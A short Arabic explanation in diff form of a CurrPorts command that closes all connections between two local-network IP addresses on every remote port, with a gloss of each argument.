+هذا الأمر يستخدم لإغلاق جميع الاتصالات إلى العنوان البعيد (Remote Address
+192.168.1.106 على جميع المنافذ التي تعمل على العملية 2548 باستخدام اداء
+CurrPorts.
+
+cports: هو اسم البرنامج الذي يستخدم لإدارة اتصالات الشبكة.
+close: يشير إلى الهدف من الأمر هو اغلاق الإتصالات.
+192.168.2.14: عنوان IP المصدر للاتصال.
+192.168.1.106: العنوان البعيد الذي نريد إغلاق الإتصالات به.
+*: يستخدم لتحديد جميع المنافذ البعيدة، مما يعني أن الأمر ينطبق على جميع المنافذ البعيدة.
+
+87
